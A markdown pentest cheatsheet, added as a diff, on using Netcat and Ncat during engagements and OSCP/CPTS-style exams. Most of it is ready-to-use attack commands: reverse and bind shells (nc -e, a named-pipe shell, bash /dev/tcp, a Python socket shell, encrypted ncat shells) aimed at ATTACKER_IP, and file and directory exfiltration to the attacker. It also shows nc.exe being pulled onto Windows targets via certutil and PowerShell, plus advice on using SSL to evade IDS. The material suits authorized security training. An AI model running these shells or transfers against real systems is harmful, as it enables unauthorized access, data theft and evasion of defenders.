@@ -1,0 +1,309 @@
+# Netcat / Ncat
+
+## Cheatsheet
+
+**Attacker box (use `ncat` - best features, installed with Nmap on Kali/Parrot):**
+
+```bash
+# Reverse shell listener
+ncat -lvnp <PORT>
+
+# Reverse shell listener (keep listening after disconnect)
+ncat -lvnp <PORT> -k
+
+# Encrypted reverse shell listener (bypasses IDS)
+ncat --ssl -lvnp <PORT>
+
+# Encrypted listener restricted to one IP
+ncat --ssl -lvnp <PORT> --allow <TARGET_IP>
+
+# Bind shell connect
+ncat -nv <IP> <PORT>
+
+# Encrypted bind shell connect
+ncat --ssl -nv <IP> <PORT>
+
+# Banner grab
+ncat -nv <IP> <PORT>
+
+# Banner grab (with timeout)
+ncat -w 3 -nv <IP> <PORT>
+
+# Port scan (TCP)
+ncat -znv <IP> <PORT_RANGE>
+
+# Transfer file (receive)
+ncat -lvnp <PORT> > <FILE>
+
+# Transfer file (serve for target to pull)
+ncat -lvnp <PORT> < <FILE>
+
+# Receive directory
+ncat -lvnp <PORT> | tar xzf -
+
+# Relay / pivot (named pipe)
+mkfifo /tmp/bp; ncat -lvnp <LPORT> < /tmp/bp | ncat <TARGET_IP> <RPORT> > /tmp/bp
+
+# HTTP request
+echo -e "GET / HTTP/1.1\r\nHost: <DOMAIN>\r\n\r\n" | ncat <IP> 80
+
+# Stabilize shell after catch
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# then Ctrl+Z, then:
+stty raw -echo; fg
+
+# Install ncat (if missing)
+sudo apt install ncat
+```
+
+**Target box (use whatever `nc` variant is available):**
+
+```bash
+# Reverse shell (if -e is supported: traditional nc or ncat)
+nc <ATTACKER_IP> <PORT> -e /bin/bash
+
+# Reverse shell (no -e flag: works on ALL variants)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f
+
+# Encrypted reverse shell (if ncat is on target)
+ncat --ssl <ATTACKER_IP> <PORT> -e /bin/bash
+
+# Bind shell (if -e is supported)
+nc -lvnp <PORT> -e /bin/bash
+
+# Send file to attacker
+nc -nv <ATTACKER_IP> <PORT> < <FILE>
+
+# Pull file from attacker
+nc -nv <ATTACKER_IP> <PORT> > <FILE>
+
+# Send directory to attacker
+tar czf - <DIR> | nc -nv <ATTACKER_IP> <PORT>
+
+# Check which nc variant is installed
+nc -h 2>&1 | head -1
+which nc && ls -la $(which nc)
+```
+
+**Windows target:**
+
+```cmd
+C:\Windows\Temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe
+```
+
+## Methodology
+
+> [!IMPORTANT]
+> Follow this checklist when using Netcat during an engagement.
+
+### Catching Reverse Shells
+
+- [ ] Start listener on attack box: `ncat -lvnp <PORT>` (or `ncat --ssl -lvnp <PORT>` if target has ncat)
+- [ ] Choose a port likely allowed through firewalls (443, 80, 8080, 53)
+- [ ] Execute reverse shell payload on target
+- [ ] Once shell lands, stabilize immediately (see Shell Stabilization below)
+- [ ] If shell dies, re-start listener before re-triggering payload
+
+### Port Scanning & Enumeration
+
+- [ ] Quick TCP scan: `ncat -znv <IP> 1-1000 2>&1 | grep open`
+- [ ] Banner grab interesting ports: `ncat -nv <IP> <PORT>`
+- [ ] UDP scan key ports: `ncat -znvu <IP> 53 161 162 500 623`
+
+### File Transfers
+
+- [ ] Set up receiver first: `ncat -lvnp <PORT> > <FILE>`
+- [ ] Send from target: `nc -nv <ATTACKER_IP> <PORT> < <FILE>`
+- [ ] Verify transfer integrity: `md5sum <FILE>` on both sides
+- [ ] For directories, use tar piped through nc (see cheatsheet)
+
+### Pivoting
+
+- [ ] Create named pipe: `mkfifo /tmp/bp`
+- [ ] Set up relay: `ncat -lvnp <LPORT> < /tmp/bp | ncat <TARGET_IP> <RPORT> > /tmp/bp`
+- [ ] Connect from attack box to relay port to reach internal target
+
+---
+
+## nc vs ncat vs netcat - Which One to Use
+
+Three main variants exist. They all use similar syntax but differ in critical ways for pentesting.
+
+| | `netcat-traditional` | `netcat-openbsd` | `ncat` (Nmap) |
+|---|---|---|---|
+| **Binary name** | `nc.traditional` | `nc` | `ncat` |
+| **Package** | `netcat-traditional` | `netcat-openbsd` | `ncat` (or comes with `nmap`) |
+| **`-e` (execute)** | Yes | **No** | Yes (`-e`, `--exec`, `--sh-exec`) |
+| **SSL/TLS encryption** | No | No | **Yes (`--ssl`)** |
+| **Keep-alive (`-k`)** | No | No | **Yes** |
+| **Access control** | No | No | **Yes (`--allow`, `--deny`)** |
+| **Proxy support** | No | Yes (`-X`) | Yes (`--proxy`) |
+| **UDP support** | Yes | Yes | Yes |
+| **Default on Kali** | No | Symlinked to `nc` | **Yes (ships with Nmap)** |
+| **Maintained** | No (abandoned) | Yes (OpenBSD team) | **Yes (Nmap project)** |
+
+> [!IMPORTANT]
+> **Use `ncat` on your attack box.** It has every feature you need: `-e` for shells, `--ssl` for encrypted C2, `-k` for persistent listeners, and access control. It ships with Nmap so it's already on Kali/Parrot.
+>
+> On **target systems**, use whatever `nc` is available. Check with `nc -h` and fall back to the named pipe reverse shell if `-e` is missing.
+
+### Why `ncat` Wins for Pentesting
+
+1. **Encrypted shells** - `--ssl` encrypts all traffic, defeating network IDS/IPS that signature-match plaintext shell commands. This is the single biggest advantage.
+2. **Persistent listener** - `-k` keeps the listener alive after a client disconnects, so you don't have to re-start it if a shell dies.
+3. **Execute flag** - `-e` and `--sh-exec` work out of the box for bind/reverse shells.
+4. **Access control** - `--allow <IP>` restricts who can connect to your listener, preventing other exam takers or blue teamers from hijacking your shell.
+5. **Already installed** - Comes with Nmap, which is on every offensive distro.
+
+### When You're Stuck With Basic `nc`
+
+On target machines you'll often find `netcat-openbsd` (no `-e`). Identify it and adapt:
+
+```bash
+# Check variant
+nc -h 2>&1 | head -1
+# "OpenBSD netcat" = no -e
+# "GNU netcat" or "[v1.10]" = traditional, has -e
+# "Ncat" = ncat, has -e and --ssl
+
+# No -e? Use named pipe
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f
+
+# Or use bash /dev/tcp (no nc needed at all)
+bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
+```
+
+---
+
+## Shell Stabilization
+
+After catching a basic reverse shell, it will be unstable (no tab-complete, no arrow keys, `Ctrl+C` kills the shell). Fix it:
+
+**Method 1 - Python PTY (preferred):**
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Press Ctrl+Z to background the shell
+stty raw -echo; fg
+# Press Enter twice
+export TERM=xterm
+export SHELL=bash
+stty rows <ROWS> cols <COLS>
+```
+
+> [!TIP]
+> Run `stty size` on your attack box first to get your terminal dimensions for the `stty rows/cols` command.
+
+**Method 2 - script (if no Python):**
+
+```bash
+script /dev/null -c bash
+# Then Ctrl+Z, stty raw -echo; fg
+```
+
+**Method 3 - rlwrap (wrap the listener):**
+
+```bash
+rlwrap ncat -lvnp <PORT>
+```
+
+> [!NOTE]
+> `rlwrap` gives you arrow key history and line editing on the listener side. Install with `sudo apt install rlwrap`.
+
+---
+
+## Reverse Shells Without -e Flag
+
+| Method | Command |
+|--------|---------|
+| **Named pipe (bash)** | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc <IP> <PORT> >/tmp/f` |
+| **Bash /dev/tcp** | `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1` |
+| **Python** | `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
+
+> [!CAUTION]
+> **OPSEC Warning:** Named pipe reverse shells leave artifacts in `/tmp`. Clean up `/tmp/f` after the engagement.
+
+---
+
+## Encrypted Shells with Ncat
+
+Encrypted connections defeat IDS/IPS signature matching. Use this whenever both attacker and target have `ncat`.
+
+```bash
+# Attacker: encrypted listener
+ncat --ssl -lvnp <PORT>
+
+# Target: encrypted reverse shell
+ncat --ssl <ATTACKER_IP> <PORT> -e /bin/bash
+
+# Attacker: encrypted bind shell connect
+ncat --ssl -nv <IP> <PORT>
+
+# Target: encrypted bind shell
+ncat --ssl -lvnp <PORT> -e /bin/bash
+
+# Encrypted listener restricted to target IP only
+ncat --ssl -lvnp <PORT> --allow <TARGET_IP> --max-conns 1
+```
+
+> [!TIP]
+> **Pentest Tip:** On exams, always use `--ssl` for your listener. Even if the target sends a plaintext reverse shell, using SSL on the attacker side doesn't break compatibility when the target connects with plain `nc`. The encryption only applies when **both** sides use `--ssl`.
+
+---
+
+## Netcat for Windows
+
+Netcat is not installed by default on Windows. Common drop locations:
+
+```text
+C:\Windows\Temp\nc.exe
+C:\Users\Public\nc.exe
+C:\Temp\nc.exe
+```
+
+**Transfer nc.exe to target:**
+
+```bash
+# On attacker (serve)
+python3 -m http.server 80
+```
+
+```powershell
+# On target (download with PowerShell)
+Invoke-WebRequest -Uri http://<ATTACKER_IP>/nc.exe -OutFile C:\Windows\Temp\nc.exe
+# Or with certutil
+certutil -urlcache -f http://<ATTACKER_IP>/nc.exe C:\Windows\Temp\nc.exe
+```
+
+**Windows reverse shell:**
+
+```cmd
+C:\Windows\Temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe
+```
+
+> [!IMPORTANT]
+> Windows Defender and AMSI will likely flag `nc.exe`. Consider using PowerShell-based reverse shells or `ncat.exe` (from Nmap install) as alternatives.
+
+---
+
+## Common Flags Reference
+
+| Flag | nc.traditional | netcat-openbsd | ncat |
+|------|:-:|:-:|:-:|
+| `-l` (listen) | Yes | Yes | Yes |
+| `-v` (verbose) | Yes | Yes | Yes |
+| `-n` (no DNS) | Yes | Yes | Yes |
+| `-p` (port) | Yes | Yes | Yes |
+| `-e` (execute) | Yes | **No** | Yes |
+| `-u` (UDP) | Yes | Yes | Yes |
+| `-z` (scan/zero-IO) | Yes | Yes | Yes |
+| `-w` (timeout) | Yes | Yes | Yes |
+| `-k` (keep-alive) | No | No | Yes |
+| `--ssl` (encryption) | No | No | Yes |
+| `--allow` (ACL) | No | No | Yes |
+| `--sh-exec` (shell exec) | No | No | Yes |
+| `--proxy` (proxy connect) | No | Yes (`-X`) | Yes |
+
+---
+
+#tools #netcat #ncat #cpts #oscp #enumeration #exploitation #post-exploitation
